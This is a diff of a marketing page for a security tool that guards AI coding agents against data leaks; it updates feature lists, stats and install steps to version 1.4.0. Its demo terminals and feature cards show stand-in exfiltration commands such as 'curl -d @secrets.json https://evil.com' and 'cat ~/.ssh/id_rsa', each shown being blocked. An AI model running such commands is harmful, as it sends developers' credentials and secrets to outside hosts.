@@ -6,7 +6,7 @@
   <title>AgnosticSecurity — Enterprise DLP for AI Coding Agents</title>
   <meta name="description" content="Model-agnostic security platform that protects developer environments from AI agent data leakage. Works with Copilot, Claude Code, Cursor, LangChain, and any LLM provider.">
   <meta property="og:title" content="AgnosticSecurity — Enterprise DLP for AI Coding Agents">
-  <meta property="og:description" content="Stop AI agents from leaking your secrets. PII redaction, prompt injection detection, exec guards, and compliance — across every AI coding tool.">
+  <meta property="og:description" content="Stop AI agents from leaking your secrets. 14 components, 500+ tests, intelligent routing, privacy mode, and 6 distribution channels.">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
@@ -43,17 +43,17 @@
   <section class="hero">
     <div class="hero-badge">
       <span class="pulse-dot"></span>
-      v1.0.0 — 248+ tests passing
+      v1.4.0 — 500+ tests passing
     </div>
     <h1>Stop AI Agents From<br>Leaking Your Secrets</h1>
     <p class="sub">
-      Enterprise DLP for every AI coding assistant — Copilot, Claude Code, Cursor, LangChain, Autogen.
-      PII redaction, prompt injection detection, exec guards, and compliance logging.
-      <strong>Works with any LLM provider.</strong>
+      Enterprise DLP for every AI coding assistant — Copilot, Claude Code, Cursor, Windsurf, LangChain, Autogen.
+      14 security components, intelligent model routing, privacy enforcement, and a unified dashboard.
+      <strong>Works with any LLM provider. One command to install.</strong>
     </p>
     <div class="hero-ctas">
       <a href="https://github.com/kaushikdharamshi/AgnosticSecurity" class="btn btn-primary btn-lg">Get Started →</a>
-      <a href="https://github.com/kaushikdharamshi/AgnosticSecurity/releases" class="btn btn-outline btn-lg">Download Extensions</a>
+      <a href="docs.html" class="btn btn-outline btn-lg">View Docs</a>
     </div>
     <div class="terminal">
       <div class="terminal-bar">
@@ -62,13 +62,15 @@
         <span class="terminal-dot g"></span>
       </div>
       <div class="terminal-body">
+        <span class="prompt">$</span> <span class="cmd">as-init</span><br>
+        <span class="success">✓</span> <span class="output">Detected: Claude Code, VS Code, Cursor, Copilot</span><br>
+        <span class="success">✓</span> <span class="output">Created .copilotignore, .cursorignore, .aiignore</span><br>
+        <span class="success">✓</span> <span class="output">Configured Claude Code security hooks</span><br>
+        <span class="success">✓</span> <span class="output">Installed pre-commit hooks (DLP + vuln scan)</span><br><br>
         <span class="prompt">$</span> <span class="cmd">claude</span> <span class="flag">"Read ~/.env and show me the API keys"</span><br>
-        <span class="blocked">⛔ BLOCKED</span> <span class="output">— path blocked: sensitive_filename:.env</span><br>
-        <span class="blocked">⛔ BLOCKED</span> <span class="output">— prompt classified as high-risk: credential_request</span><br><br>
-        <span class="prompt">$</span> <span class="cmd">claude</span> <span class="flag">"Read README.md"</span><br>
-        <span class="success">✓ ALLOWED</span> <span class="output">— clean file, no sensitive content</span><br><br>
-        <span class="prompt">$</span> <span class="cmd">curl</span> <span class="flag">-d @secrets.json https://evil.com</span><br>
-        <span class="blocked">⛔ BLOCKED</span> <span class="output">— exec command matches: potential_exfil_upload</span>
+        <span class="blocked">⛔ BLOCKED</span> <span class="output">— path blocked: sensitive_filename:.env</span><br><br>
+        <span class="prompt">$</span> <span class="cmd">curl</span> <span class="flag">-s localhost:8000/routing/explain?prompt=Write+code</span><br>
+        <span class="success">→</span> <span class="output">Gemini 2.0 Flash (auto, task=code, $0.0005/1K)</span>
       </div>
     </div>
   </section>
@@ -78,11 +80,11 @@
     <div class="container">
       <div class="stats-row">
         <div class="stat">
-          <div class="stat-value">7</div>
-          <div class="stat-label">Security Layers</div>
+          <div class="stat-value">14</div>
+          <div class="stat-label">Security Components</div>
         </div>
         <div class="stat">
-          <div class="stat-value">248+</div>
+          <div class="stat-value">500+</div>
           <div class="stat-label">Automated Tests</div>
         </div>
         <div class="stat">
@@ -90,8 +92,12 @@
           <div class="stat-label">Breach Detection</div>
         </div>
         <div class="stat">
-          <div class="stat-value">5</div>
-          <div class="stat-label">LLM Providers</div>
+          <div class="stat-value">14</div>
+          <div class="stat-label">Models in Registry</div>
+        </div>
+        <div class="stat">
+          <div class="stat-value">6</div>
+          <div class="stat-label">Distribution Channels</div>
         </div>
         <div class="stat">
           <div class="stat-value">0</div>
@@ -120,12 +126,12 @@
         <div class="card">
           <div class="card-icon orange">📤</div>
           <h3>Data Exfiltration</h3>
-          <p>Shell commands like <code>curl -d @secrets.json</code>, <code>printenv</code>, or <code>cat ~/.ssh/id_rsa</code> can leak data before anyone notices.</p>
+          <p>Shell commands like <code>curl -d @secrets.json</code>, <code>printenv</code>, or encoded pipelines can leak data before anyone notices.</p>
         </div>
         <div class="card">
           <div class="card-icon purple">⚖️</div>
-          <h3>Compliance Risk</h3>
-          <p>PCI-DSS, SOX, HIPAA — all require strict controls over sensitive data access. AI agents bypass every one of them.</p>
+          <h3>Shadow AI &amp; Compliance</h3>
+          <p>Unauthorized AI tools running without security team visibility. PCI-DSS, SOX, HIPAA all require controls over sensitive data access.</p>
         </div>
       </div>
     </div>
@@ -136,29 +142,33 @@
     <div class="container">
       <div class="section-header center">
         <span class="section-eyebrow"><span class="dot"></span> Architecture</span>
-        <h2 class="section-title">Seven Layers of <span class="accent">Defense in Depth</span></h2>
+        <h2 class="section-title">Fourteen Components, <span class="accent">Defense in Depth</span></h2>
         <p class="section-sub">
-          Every AI interaction passes through multiple independent security layers. Any single layer can fail and others still protect.
+          Every AI interaction passes through multiple independent security layers. Any single layer can fail and the others still protect.
         </p>
       </div>
       <div class="arch-diagram">
 <pre>
-<span class="layer">Developer using Copilot / Claude Code / Cursor / LangChain</span>
+<span class="layer">Developer using Copilot / Claude Code / Cursor / Windsurf / LangChain</span>
   │
   ├── <span class="component">VS Code Extension</span> <span class="detail">── Blocks Copilot from seeing sensitive files</span>
-  │
+  ├── <span class="component">Chrome Extension</span> <span class="detail">── DLP for ChatGPT, Claude, Gemini web UIs</span>
   ├── <span class="component">Claude Code Hooks</span> <span class="detail">── DLP file gate + exec guard + prompt analysis</span>
-  │
   ├── <span class="component">Auto-Instrumentation</span> <span class="detail">── Zero-code patching for OpenAI/Anthropic/LangChain</span>
   │
-  ├── <span class="component">Security Gateway</span> <span class="detail">── All LLM API calls routed through proxy</span>
-  │   ├── <span class="highlight">Input:</span> <span class="detail">injection detection + prompt masking + media filter + PII redaction</span>
-  │   ├── <span class="highlight">Output:</span> <span class="detail">harmful content + PII redaction + context leak detection</span>
-  │   └── <span class="detail">Block rules + cost tracking (16-model pricing)</span>
+  ├── <span class="component">Smart Router</span> <span class="detail">── Auto-selects best model by task, cost, latency, privacy</span>
+  ├── <span class="component">Security Gateway</span> <span class="detail">── All LLM API calls with DLP scanning</span>
+  │   ├── <span class="highlight">Input:</span> <span class="detail">injection detection + PII redaction + media filtering</span>
+  │   ├── <span class="highlight">Output:</span> <span class="detail">harmful content + PII redaction + leak detection</span>
+  │   └── <span class="detail">Block rules + cost tracking (14-model pricing)</span>
   │
+  ├── <span class="component">Privacy Mode</span> <span class="detail">── 3 modes: full_privacy / balanced / permissive</span>
   ├── <span class="component">Effect-Layer Defenses</span> <span class="detail">── Taint tracking, egress allowlist, lethal trifecta</span>
+  ├── <span class="component">Knowledge Graph</span> <span class="detail">── SQLite-backed threat/agent/incident correlation</span>
   │
   └── <span class="component">Breach Compliance</span> <span class="detail">── 13 fintech breach types, SHA-256 audit log</span>
+
+  <span class="component">Distribution:</span> <span class="detail">as-init CLI │ Pre-commit Hooks │ GitHub Action │ Docker │ Dashboard</span>
 </pre>
       </div>
     </div>
@@ -180,42 +190,57 @@
         <div class="card">
           <div class="card-icon green">⌨️</div>
           <h3>Exec Command Guard</h3>
-          <p>20+ regex patterns with LLM verification. Blocks <code>cat ~/.env</code>, <code>printenv</code>, curl exfiltration, and obfuscated commands.</p>
+          <p>20+ regex patterns with LLM verification. Blocks exfiltration, obfuscated commands, env dumps, and encoded pipelines.</p>
         </div>
         <div class="card">
           <div class="card-icon blue">🧠</div>
           <h3>Prompt Intent Analysis</h3>
-          <p>4-layer detection: PII regex → intent keywords → Pydantic rules → local Ollama LLM. Catches "get me all SSNs" before it executes.</p>
+          <p>4-layer detection with 10 decoding sublayers (base64, hex, ROT13, unicode, zero-width chars). Catches evasion attacks.</p>
         </div>
         <div class="card">
-          <div class="card-icon orange">🔐</div>
-          <h3>PII Redaction</h3>
-          <p>Detects and redacts email, phone, SSN, credit cards, API keys in both inputs and outputs. Modifies in-place — doesn't block.</p>
+          <div class="card-icon red">🔍</div>
+          <h3>Vulnerability Scanner</h3>
+          <p>OWASP Top 10 SAST-lite — catches SQL injection, XSS, command injection in AI-generated code before it hits disk.</p>
         </div>
         <div class="card">
-          <div class="card-icon purple">🖥️</div>
-          <h3>System Prompt Masking</h3>
-          <p>Strips hostname, OS, username, and repo paths from system prompts before they reach the LLM. No infrastructure leakage.</p>
+          <div class="card-icon orange">🔀</div>
+          <h3>Smart Router</h3>
+          <p>Auto-selects the best model by task type, cost, and latency. 14 models, 5 strategies, automatic failover across providers.</p>
         </div>
         <div class="card">
-          <div class="card-icon red">📸</div>
-          <h3>Media Filtering</h3>
-          <p>Blocks image, audio, and video attachments from multi-part messages. Prevents visual PII leakage via screenshots.</p>
+          <div class="card-icon purple">🔒</div>
+          <h3>Privacy Mode</h3>
+          <p>3 enforced modes: full_privacy (local only), balanced (cloud + DLP), permissive (log only). One-command cloud killswitch.</p>
         </div>
         <div class="card">
-          <div class="card-icon indigo">🔑</div>
-          <h3>Session Encryption</h3>
-          <p>AES-256-GCM encryption for audit log entries and session data at rest. PBKDF2 key derivation.</p>
+          <div class="card-icon indigo">👁️</div>
+          <h3>Shadow AI Detector</h3>
+          <p>Discovers 12+ AI tools running on developer machines (Cursor, Tabnine, Codeium, etc.) and flags unauthorized ones.</p>
         </div>
         <div class="card">
-          <div class="card-icon green">📊</div>
+          <div class="card-icon green">🧬</div>
+          <h3>Code Fingerprint Guard</h3>
+          <p>Prevents proprietary code from leaking to cloud LLMs. N-gram Jaccard similarity catches renamed variables.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon blue">🕸️</div>
+          <h3>Knowledge Graph</h3>
+          <p>SQLite-backed graph linking agents, threats, data assets, and incidents. Enables "agent X triggered threat Y" correlation.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon orange">📝</div>
+          <h3>Security Memory</h3>
+          <p>Obsidian-compatible vault for daily logs, threat intel, incidents, agent profiles, and policy decisions. Human-readable audit trail.</p>
+        </div>
+        <div class="card">
+          <div class="card-icon red">📊</div>
           <h3>Breach Compliance</h3>
-          <p>13 fintech breach types (PCI-DSS, SOX, HIPAA). Immutable SHA-256 audit log. Real-time dashboard with webhook alerting.</p>
+          <p>13 fintech breach types (PCI-DSS, SOX, HIPAA). Immutable SHA-256 audit log. Configurable taxonomy. Webhook alerting.</p>
         </div>
         <div class="card">
-          <div class="card-icon blue">🔌</div>
-          <h3>Auto-Instrumentation</h3>
-          <p>Zero-code monkey-patching for OpenAI, Anthropic, and LangChain SDKs. Every LLM call monitored automatically.</p>
+          <div class="card-icon purple">✅</div>
+          <h3>Confidence Scoring</h3>
+          <p>Luhn checksum for credit cards, SSA rules for SSNs, Shannon entropy for API keys. Eliminates false positives across all surfaces.</p>
         </div>
       </div>
     </div>
@@ -238,46 +263,20 @@
             </tr>
           </thead>
           <tbody>
-            <tr>
-              <td><strong>File gate</strong></td>
-              <td>AI reading .env, credentials, PII files</td>
-              <td>2-layer path + content DLP</td>
-            </tr>
-            <tr>
-              <td><strong>Exec guard</strong></td>
-              <td>Shell exfiltration, obfuscated commands</td>
-              <td>20+ regex patterns + Ollama LLM verification</td>
-            </tr>
-            <tr>
-              <td><strong>Prompt guard</strong></td>
-              <td>Data extraction, jailbreaks</td>
-              <td>4-layer: PII regex → keywords → rules → LLM</td>
-            </tr>
-            <tr>
-              <td><strong>Write protection</strong></td>
-              <td>AI modifying sensitive files</td>
-              <td>Edit guard reverts + read-only include</td>
-            </tr>
-            <tr>
-              <td><strong>Gateway</strong></td>
-              <td>PII leakage, prompt injection</td>
-              <td>Input/output security pipelines</td>
-            </tr>
-            <tr>
-              <td><strong>Taint tracking</strong></td>
-              <td>Data flow exfiltration</td>
-              <td>SHA-256 hash + n-gram Jaccard at egress</td>
-            </tr>
-            <tr>
-              <td><strong>Egress allowlist</strong></td>
-              <td>Unauthorized outbound domains</td>
-              <td>EA_ALLOWED_DOMAINS blocks unlisted hosts</td>
-            </tr>
-            <tr>
-              <td><strong>Lethal trifecta</strong></td>
-              <td>Combined private-data + untrusted-input + external-comm</td>
-              <td>Blocks MCP tools when all 3 conditions met</td>
-            </tr>
+            <tr><td><strong>File gate</strong></td><td>AI reading .env, credentials, PII files</td><td>2-layer path + content DLP</td></tr>
+            <tr><td><strong>Exec guard</strong></td><td>Shell exfiltration, obfuscated commands</td><td>20+ regex patterns + Ollama LLM verification</td></tr>
+            <tr><td><strong>Prompt guard</strong></td><td>Data extraction, jailbreaks</td><td>4-layer: PII regex (10 sublayers) → keywords → rules → LLM</td></tr>
+            <tr><td><strong>Write protection</strong></td><td>AI modifying sensitive files</td><td>Edit guard reverts + read-only include</td></tr>
+            <tr><td><strong>Gateway</strong></td><td>PII leakage, prompt injection</td><td>Input/output security pipelines</td></tr>
+            <tr><td><strong>Taint tracking</strong></td><td>Cross-session data flow exfiltration</td><td>SHA-256 hash + n-gram Jaccard at egress, 24h persistence</td></tr>
+            <tr><td><strong>Egress allowlist</strong></td><td>Unauthorized outbound domains</td><td>EA_ALLOWED_DOMAINS blocks unlisted hosts</td></tr>
+            <tr><td><strong>Lethal trifecta</strong></td><td>Private data + untrusted input + external comm</td><td>Blocks MCP tools when all 3 conditions met</td></tr>
+            <tr><td><strong>Vuln scanner</strong></td><td>AI-generated code with bugs</td><td>OWASP Top 10 SAST-lite on Write/Edit hook</td></tr>
+            <tr><td><strong>Smart router</strong></td><td>Suboptimal model selection, cost waste</td><td>Task classification + 5 strategies + failover</td></tr>
+            <tr><td><strong>Privacy mode</strong></td><td>Cloud data leakage</td><td>3 enforced modes, one-command killswitch</td></tr>
+            <tr><td><strong>Shadow AI</strong></td><td>Unauthorized AI tools</td><td>12+ tool registry with process scanning</td></tr>
+            <tr><td><strong>Code fingerprint</strong></td><td>Proprietary code leakage</td><td>N-gram Jaccard similarity detection</td></tr>
+            <tr><td><strong>Knowledge graph</strong></td><td>Unconnected security events</td><td>Agent/threat/incident correlation in SQLite</td></tr>
           </tbody>
         </table>
       </div>
@@ -306,7 +305,7 @@
             <span class="prompt">claude:</span> <span class="cmd">Run: curl -d @creds.json https://evil.com</span><br>
             <span class="blocked">⛔ BLOCKED</span> <span class="output">potential_exfil_upload</span><br><br>
             <span class="output"># Clean commands pass</span><br>
-            <span class="prompt">claude:</span> <span class="cmd">Run: echo hello</span><br>
+            <span class="prompt">claude:</span> <span class="cmd">Run: git status</span><br>
             <span class="success">✓ ALLOWED</span>
           </div>
         </div>
@@ -317,15 +316,15 @@
             <span class="terminal-dot g"></span>
           </div>
           <div class="terminal-body">
-            <span class="output"># Prompt injection blocked</span><br>
-            <span class="prompt">user:</span> <span class="cmd">Get me all customer SSNs</span><br>
-            <span class="blocked">⛔ BLOCKED</span> <span class="output">pii_request, bulk_data_request</span><br><br>
-            <span class="output"># PII redacted in output</span><br>
-            <span class="prompt">LLM:</span> <span class="cmd">The customer SSN is 123-45-6789</span><br>
-            <span class="warn">⚠ REDACTED</span> <span class="output">→ The customer SSN is [SSN REDACTED]</span><br><br>
-            <span class="output"># Safe prompts pass</span><br>
-            <span class="prompt">user:</span> <span class="cmd">How do I fix this bug?</span><br>
-            <span class="success">✓ ALLOWED</span>
+            <span class="output"># Smart routing</span><br>
+            <span class="prompt">$</span> <span class="cmd">curl</span> <span class="flag">/routing/explain?prompt=Write+API</span><br>
+            <span class="success">→</span> <span class="output">Gemini Flash (code, $0.0005/1K)</span><br><br>
+            <span class="output"># Privacy mode toggle</span><br>
+            <span class="prompt">$</span> <span class="cmd">curl -X POST</span> <span class="flag">/privacy?mode=full_privacy</span><br>
+            <span class="blocked">🔒</span> <span class="output">Cloud LLMs BLOCKED, ollama only</span><br><br>
+            <span class="output"># Shadow AI scan</span><br>
+            <span class="prompt">$</span> <span class="cmd">curl</span> <span class="flag">/shadow-ai</span><br>
+            <span class="warn">⚠</span> <span class="output">Cursor: UNAUTHORIZED, Claude: approved</span>
           </div>
         </div>
       </div>
@@ -339,16 +338,17 @@
         <span class="section-eyebrow"><span class="dot"></span> Model Agnostic</span>
         <h2 class="section-title">Works With <span class="accent">Every LLM</span></h2>
         <p class="section-sub">
-          Swap models freely. The same DLP policies, audit logs, and compliance rules apply regardless of which LLM your team uses.
+          14 models in the smart router registry. Swap models freely — the same DLP policies, audit logs, and compliance rules apply.
         </p>
       </div>
       <div class="layer-grid" style="max-width: 700px; margin: 0 auto;">
-        <div class="layer-chip"><span class="dot indigo"></span><span class="name">OpenAI (GPT-4o)</span></div>
-        <div class="layer-chip"><span class="dot purple"></span><span class="name">Anthropic (Claude)</span></div>
-        <div class="layer-chip"><span class="dot blue"></span><span class="name">Google (Gemini)</span></div>
+        <div class="layer-chip"><span class="dot indigo"></span><span class="name">OpenAI (GPT-4o, 4.1)</span></div>
+        <div class="layer-chip"><span class="dot purple"></span><span class="name">Anthropic (Claude 4.6)</span></div>
+        <div class="layer-chip"><span class="dot blue"></span><span class="name">Google (Gemini 2.5)</span></div>
         <div class="layer-chip"><span class="dot green"></span><span class="name">Azure OpenAI</span></div>
         <div class="layer-chip"><span class="dot orange"></span><span class="name">GitHub Models</span></div>
         <div class="layer-chip"><span class="dot red"></span><span class="name">Ollama (Local)</span></div>
+        <div class="layer-chip"><span class="dot indigo"></span><span class="name">OpenRouter</span></div>
       </div>
     </div>
   </section>
@@ -358,27 +358,68 @@
     <div class="container">
       <div class="section-header center">
         <span class="section-eyebrow"><span class="dot"></span> Get Started</span>
-        <h2 class="section-title">Install in <span class="accent">30 Seconds</span></h2>
+        <h2 class="section-title">6 Ways to <span class="accent">Install</span></h2>
       </div>
-      <div class="grid-2">
+      <div class="grid-3">
         <div class="card">
-          <div class="card-icon indigo">🧩</div>
-          <h3>VS Code / Cursor Extension</h3>
-          <p style="margin-bottom: 1rem;">Download the .vsix from GitHub Releases and install:</p>
-          <div class="terminal" style="margin: 0;">
-            <div class="terminal-body" style="padding: 0.8rem 1rem;">
-              <span class="prompt">$</span> <span class="cmd">code</span> <span class="flag">--install-extension agnostic-security-1.3.0.vsix</span>
+          <div class="card-icon indigo">⚡</div>
+          <h3>One-Command Setup</h3>
+          <p>Auto-detects all AI tools and configures protections:</p>
+          <div class="terminal" style="margin: 0.5rem 0 0;">
+            <div class="terminal-body" style="padding: 0.6rem 0.8rem;">
+              <span class="prompt">$</span> <span class="cmd">pip install -e .</span><br>
+              <span class="prompt">$</span> <span class="cmd">as-init</span>
             </div>
           </div>
         </div>
         <div class="card">
-          <div class="card-icon green">🖥️</div>
-          <h3>Security Gateway</h3>
-          <p style="margin-bottom: 1rem;">Clone and run the API proxy:</p>
-          <div class="terminal" style="margin: 0;">
-            <div class="terminal-body" style="padding: 0.8rem 1rem;">
-              <span class="prompt">$</span> <span class="cmd">pip install</span> <span class="flag">-r requirements.txt</span><br>
-              <span class="prompt">$</span> <span class="cmd">uvicorn main:app</span> <span class="flag">--port 8000</span>
+          <div class="card-icon green">🪝</div>
+          <h3>Pre-commit Hooks</h3>
+          <p>DLP + vulnerability scan on every git commit:</p>
+          <div class="terminal" style="margin: 0.5rem 0 0;">
+            <div class="terminal-body" style="padding: 0.6rem 0.8rem;">
+              <span class="prompt">$</span> <span class="cmd">bash hooks/install.sh</span>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-icon blue">🐳</div>
+          <h3>Docker</h3>
+          <p>Gateway + LLM proxy + breach engine:</p>
+          <div class="terminal" style="margin: 0.5rem 0 0;">
+            <div class="terminal-body" style="padding: 0.6rem 0.8rem;">
+              <span class="prompt">$</span> <span class="cmd">docker compose up</span>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-icon orange">📊</div>
+          <h3>Admin Dashboard</h3>
+          <p>11-tab React UI — privacy, routing, shadow AI, graph:</p>
+          <div class="terminal" style="margin: 0.5rem 0 0;">
+            <div class="terminal-body" style="padding: 0.6rem 0.8rem;">
+              <span class="prompt">$</span> <span class="cmd">uvicorn main:app</span> <span class="flag">--port 8000</span><br>
+              <span class="output">→ open /unified</span>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-icon purple">🔄</div>
+          <h3>GitHub Action</h3>
+          <p>Scans every PR for PII + vulnerabilities:</p>
+          <div class="terminal" style="margin: 0.5rem 0 0;">
+            <div class="terminal-body" style="padding: 0.6rem 0.8rem; font-size: 0.75em;">
+              <span class="output">uses: ./.github/actions/security-scan</span>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-icon red">🧩</div>
+          <h3>Extensions</h3>
+          <p>VS Code + Chrome — zero config DLP:</p>
+          <div class="terminal" style="margin: 0.5rem 0 0;">
+            <div class="terminal-body" style="padding: 0.6rem 0.8rem; font-size: 0.75em;">
+              <span class="prompt">$</span> <span class="cmd">code</span> <span class="flag">--install-extension agnostic-security.vsix</span>
             </div>
           </div>
         </div>
@@ -391,22 +432,22 @@
     <div class="container" style="position: relative; z-index: 1;">
       <h2 class="section-title" style="margin-bottom: 1rem;">Secure Your AI Agents <span class="accent">Today</span></h2>
       <p class="section-sub" style="margin: 0 auto 2rem; text-align: center;">
-        Open source. Local-first. Zero telemetry. Works with any LLM.
+        Open source. Local-first. Zero telemetry. Works with any LLM. One command to install.
       </p>
       <div style="display: flex; gap: 0.75rem; justify-content: center; flex-wrap: wrap;">
         <a href="https://github.com/kaushikdharamshi/AgnosticSecurity" class="btn btn-primary btn-lg">View on GitHub →</a>
-        <a href="https://github.com/kaushikdharamshi/AgnosticSecurity/releases" class="btn btn-outline btn-lg">Download v1.0.0</a>
+        <a href="https://github.com/kaushikdharamshi/AgnosticSecurity/releases" class="btn btn-outline btn-lg">Download v1.4.0</a>
       </div>
     </div>
   </section>
 
   <!-- Footer -->
-    <footer class="footer">
+  <footer class="footer">
     <div class="container">
       <div class="footer-grid">
         <div>
           <div class="footer-brand"><span class="icon">🔒</span> AgnosticSecurity</div>
-          <p class="footer-desc">Enterprise DLP for AI coding agents — model-agnostic security middleware that intercepts file reads, commands, prompts, API calls, and responses across all AI coding tools.</p>
+          <p class="footer-desc">Enterprise DLP for AI coding agents — 14 security components, intelligent routing, privacy enforcement, and 6 distribution channels across every AI coding tool.</p>
         </div>
         <div>
           <h4>Product</h4>
